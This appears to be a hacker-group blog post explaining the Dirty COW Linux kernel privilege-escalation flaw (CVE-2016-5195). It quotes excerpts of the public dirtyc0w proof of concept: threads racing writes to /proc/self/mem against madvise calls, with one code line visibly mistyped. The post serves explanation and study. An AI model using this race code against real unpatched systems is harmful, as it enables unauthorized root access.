<!doctype html><html lang=en-us>
<head>
<link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous>
<link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous>
<script type=text/javascript src=https://latest.cactus.chat/cactus.js></script>
<link rel=stylesheet href=https://latest.cactus.chat/style.css type=text/css>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<title> | SixSixtySix Corp.</title>
<link rel=canonical href=https://6sixty6.github.io/posts/2022-02-19-dirty-cow/>
<meta name=description content="KEEPING THE SCENE ALIVE ðŸ‘¾ ðŸš€">
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=robots content="all,follow">
<meta name=googlebot content="index,follow,snippet,archive">
<meta property="og:title" content>
<meta property="og:description" content="author: [anusO1] Details about &ldquo;Dirty Cow&rdquo; (CVE-2016-5195) COW (Copy on Write) Copy on Write is an optimization technique that allows virtual pages of memory in different processes, which have identical content to map to the same physical memory pages. If one of the processes writes to one of these shared pages, the data is copied to a new physical page and the virtual-to-physical-memory mappings are updated according to the changes. This techniqie is used (and abused) in many different scenarios.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://6sixty6.github.io/posts/2022-02-19-dirty-cow/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-02-19T21:50:00+00:00">
<meta property="article:modified_time" content="2022-02-19T21:50:00+00:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content>
<meta name=twitter:description content="author: [anusO1] Details about &ldquo;Dirty Cow&rdquo; (CVE-2016-5195) COW (Copy on Write) Copy on Write is an optimization technique that allows virtual pages of memory in different processes, which have identical content to map to the same physical memory pages. If one of the processes writes to one of these shared pages, the data is copied to a new physical page and the virtual-to-physical-memory mappings are updated according to the changes. This techniqie is used (and abused) in many different scenarios.">
<link rel=stylesheet href=https://6sixty6.github.io/css/styles.f4bcceabbdd517d94a591c375093a75082a29fe2890ff08dc010a5a3d0f4ac93e03a09e432cecb1b27ff0942772ab90896387af68ddd8ffa54ac31824f281ef1.css integrity="sha512-9LzOq73VF9lKWRw3UJOnUIKin+KJD/CNwBClo9D0rJPgOgnkMs7LGyf/CUJ3KrkIljh69o3dj/pUrDGCTyge8Q=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script>
<script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]-->
<link rel=icon type=image/png href=https://6sixty6.github.io/images/favicon.ico>
</head>
<body class="max-width mx-auto px3 ltr">
<div class="content index py4">
<div id=header-post>
<a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick="$('html, body').animate({scrollTop:0},'fast')" style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu>
<span id=nav>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writings</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
<li><a href=/members>Members</a></li>
</ul>
</span>
<br>
<span id=actions>
<ul>
<li>
<a class=icon href=https://6sixty6.github.io/posts/2022-02-19-gcc-silent-trampoline-execstack-abuse/ aria-label=Previous>
<i class="fas fa-chevron-left" aria-hidden=true onmouseover="$('#i-prev').toggle()" onmouseout="$('#i-prev').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up" aria-hidden=true onmouseover="$('#i-top').toggle()" onmouseout="$('#i-top').toggle()"></i>
</a>
</li>
<li>
<a class=icon href=# aria-label=Share>
<i class="fas fa-share-alt" aria-hidden=true onmouseover="$('#i-share').toggle()" onmouseout="$('#i-share').toggle()" onclick="return $('#share').toggle(),!1"></i>
</a>
</li>
</ul>
<span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span>
</span>
<br>
<div id=share style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f" aria-label=Facebook>
<i class="fab fa-facebook" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&text=" aria-label=Twitter>
<i class="fab fa-twitter" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&title=" aria-label=Linkedin>
<i class="fab fa-linkedin" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&is_video=false&description=" aria-label=Pinterest>
<i class="fab fa-pinterest" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=&body=Check out this article: https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f" aria-label=Email>
<i class="fas fa-envelope" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&title=" aria-label=Pocket>
<i class="fab fa-get-pocket" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&title=" aria-label=reddit>
<i class="fab fa-reddit" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&name=&description=author%3a%20%5banusO1%5d%20Details%20about%20%26ldquo%3bDirty%20Cow%26rdquo%3b%20%28CVE-2016-5195%29%20COW%20%28Copy%20on%20Write%29%20Copy%20on%20Write%20is%20an%20optimization%20technique%20that%20allows%20virtual%20pages%20of%20memory%20in%20different%20processes%2c%20which%20have%20identical%20content%20to%20map%20to%20the%20same%20physical%20memory%20pages.%20If%20one%20of%20the%20processes%20writes%20to%20one%20of%20these%20shared%20pages%2c%20the%20data%20is%20copied%20to%20a%20new%20physical%20page%20and%20the%20virtual-to-physical-memory%20mappings%20are%20updated%20according%20to%20the%20changes.%20This%20techniqie%20is%20used%20%28and%20abused%29%20in%20many%20different%20scenarios." aria-label=Tumblr>
<i class="fab fa-tumblr" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&t=" aria-label="Hacker News">
<i class="fab fa-hacker-news" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=toc>
<nav id=TableOfContents>
<ul>
<li><a href=#author-anuso1httpsgithubcomcalebrwalk5>author: <a href=https://github.com/calebrwalk5>[anusO1]</a></a></li>
<li><a href=#details-about-dirty-cow-cve-2016-5195>Details about &ldquo;Dirty Cow&rdquo; (CVE-2016-5195)</a></li>
<li><a href=#cow-copy-on-write>COW (Copy on Write)</a></li>
<li><a href=#vulnerability>Vulnerability</a></li>
<li><a href=#who-found-the-dirty-cow-vulnerability>Who found the &ldquo;Dirty Cow&rdquo; vulnerability?</a></li>
<li><a href=#more-info>More Info</a></li>
</ul>
</nav>
</div>
</span>
</div>
<article class=post itemscope itemtype=http://schema.org/BlogPosting>
<header>
<h1 class=posttitle itemprop="name headline">
</h1>
<div class=meta>
<div class=postdate>
<time datetime="2022-02-19 21:50:00 +0000 UTC" itemprop=datePublished>2022-02-19</time>
</div>
<div class=article-tag>
<i class="fas fa-tag"></i>
<a class=tag-link href=/tags/linux rel=tag>linux</a>
,
<a class=tag-link href=/tags/cow rel=tag>COW</a>
,
<a class=tag-link href=/tags/anuso1 rel=tag>anusO1</a>
</div>
</div>
</header>
<div class=content itemprop=articleBody>
<h2 id=author-anuso1httpsgithubcomcalebrwalk5>author: <a href=https://github.com/calebrwalk5>[anusO1]</a></h2>
<h2 id=details-about-dirty-cow-cve-2016-5195>Details about &ldquo;Dirty Cow&rdquo; (CVE-2016-5195)</h2>
<h2 id=cow-copy-on-write>COW (Copy on Write)</h2>
<p>Copy on Write is an optimization technique that allows virtual pages of memory in different processes, which have identical content to map to the same physical memory pages. If one of the processes writes to one of these shared pages, the data is copied to a new physical page and the virtual-to-physical-memory mappings are updated according to the changes. This techniqie is used (and abused) in many different scenarios.</p>
<h2 id=vulnerability>Vulnerability</h2>
<p>&ldquo;Dirty Cow&rdquo; (CVE-2016-5195) is a privilege escelation vulnerability in the Linux kernel. Here we are looking at the <a href=https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c>&ldquo;dirtyc0w PoC&rdquo;</a></p>
<pre tabindex=0><code>map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
</code></pre><p>It starts two threads. One thread opens /proc/self/mem read-write and loops millions of times writing the data specified on the command-line to it at the offset of the mmapâ€™ed file. /proc/self/mem is an entry in the procfs virtual file system which gives access to the pages of a current processâ€™s virtual memory.</p>
<pre tabindex=0><code>void *procselfmemThread(void *arg) {
	char *str;
	str=(char*)arg;
	int f=open(&quot;/proc/self/mem&quot;,O_RDWR);
	int i,c=0;
	for(i=0;i&lt;100000000;i++) {
		lseek(f,(uintptr_t) map,SEEK_SET);
		c+=write(f,str,strlen(str));
	}
	printf(&quot;procselfmem %d\n\n&quot;, c);
}
</code></pre><p>This writes to /proc/self/mem and triggers COWs, but these pages are marked a private, and the memory pages will not be written back to the mapped file. However, the other thread loops, again millions of times, calling the madvise(2) system call on the same offset with the flag MADV_DONTNEED which tells the kernel to discard the pages that are mmapâ€™ed.</p>
<pre tabindex=0><code>void *madviseThread(void *arg) {
	char *str;
	str(char*)arg;
	int i,c=0;
	for(i=0;i&lt;100000000;i++) {
		c+=madvise(map,100,MADV_DONTNEED);
	}
	printf(&quot;madvise %d\n\n&quot;,c);
}
</code></pre><h2 id=who-found-the-dirty-cow-vulnerability>Who found the &ldquo;Dirty Cow&rdquo; vulnerability?</h2>
<p><a href=https://access.redhat.com/security/cve/CVE-2016-5195>Phil Oester</a> found it in October of 2016</p>
<h2 id=more-info>More Info</h2>
<p><a href=https://security-tracker.debian.org/tracker/CVE-2016-5195>Debian</a>
<a href=https://dirtycow.ninja>dirtycow.ninja</a>
<a href=https://en.wikipedia.org/wiki/Dirty_COW>Wikipedia</a></p>
</div>
</article>
<div id=footer-post-container>
<div id=footer-post>
<div id=nav-footer style=display:none>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writings</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
<li><a href=/members>Members</a></li>
</ul>
</div>
<div id=toc-footer style=display:none>
<nav id=TableOfContents>
<ul>
<li><a href=#author-anuso1httpsgithubcomcalebrwalk5>author: <a href=https://github.com/calebrwalk5>[anusO1]</a></a></li>
<li><a href=#details-about-dirty-cow-cve-2016-5195>Details about &ldquo;Dirty Cow&rdquo; (CVE-2016-5195)</a></li>
<li><a href=#cow-copy-on-write>COW (Copy on Write)</a></li>
<li><a href=#vulnerability>Vulnerability</a></li>
<li><a href=#who-found-the-dirty-cow-vulnerability>Who found the &ldquo;Dirty Cow&rdquo; vulnerability?</a></li>
<li><a href=#more-info>More Info</a></li>
</ul>
</nav>
</div>
<div id=share-footer style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f" aria-label=Facebook>
<i class="fab fa-facebook fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&text=" aria-label=Twitter>
<i class="fab fa-twitter fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&title=" aria-label=Linkedin>
<i class="fab fa-linkedin fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&is_video=false&description=" aria-label=Pinterest>
<i class="fab fa-pinterest fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=&body=Check out this article: https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f" aria-label=Email>
<i class="fas fa-envelope fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&title=" aria-label=Pocket>
<i class="fab fa-get-pocket fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&title=" aria-label=reddit>
<i class="fab fa-reddit fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&name=&description=author%3a%20%5banusO1%5d%20Details%20about%20%26ldquo%3bDirty%20Cow%26rdquo%3b%20%28CVE-2016-5195%29%20COW%20%28Copy%20on%20Write%29%20Copy%20on%20Write%20is%20an%20optimization%20technique%20that%20allows%20virtual%20pages%20of%20memory%20in%20different%20processes%2c%20which%20have%20identical%20content%20to%20map%20to%20the%20same%20physical%20memory%20pages.%20If%20one%20of%20the%20processes%20writes%20to%20one%20of%20these%20shared%20pages%2c%20the%20data%20is%20copied%20to%20a%20new%20physical%20page%20and%20the%20virtual-to-physical-memory%20mappings%20are%20updated%20according%20to%20the%20changes.%20This%20techniqie%20is%20used%20%28and%20abused%29%20in%20many%20different%20scenarios." aria-label=Tumblr>
<i class="fab fa-tumblr fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f6sixty6.github.io%2fposts%2f2022-02-19-dirty-cow%2f&t=" aria-label="Hacker News">
<i class="fab fa-hacker-news fa-lg" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=actions-footer>
<a id=menu-toggle class=icon href=# onclick="return $('#nav-footer').toggle(),!1" aria-label=Menu>
<i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick="return $('#toc-footer').toggle(),!1" aria-label=TOC>
<i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick="return $('#share-footer').toggle(),!1" aria-label=Share>
<i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a>
</div>
</div>
</div>
<footer id=footer>
<div class=footer-left>
Copyright &copy; 2022 SixSixtySix Corp.
</div>
<div class=footer-right>
<nav>
<ul>
<li><a href=/>Home</a></li>
<li><a href=/posts>Writings</a></li>
<li><a href=/tags>Tags</a></li>
<li><a href=/about>About</a></li>
<li><a href=/members>Members</a></li>
</ul>
</nav>
</div>
</footer>
</div>
</body>
<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>
<script src=/js/code-copy.js></script>
</html>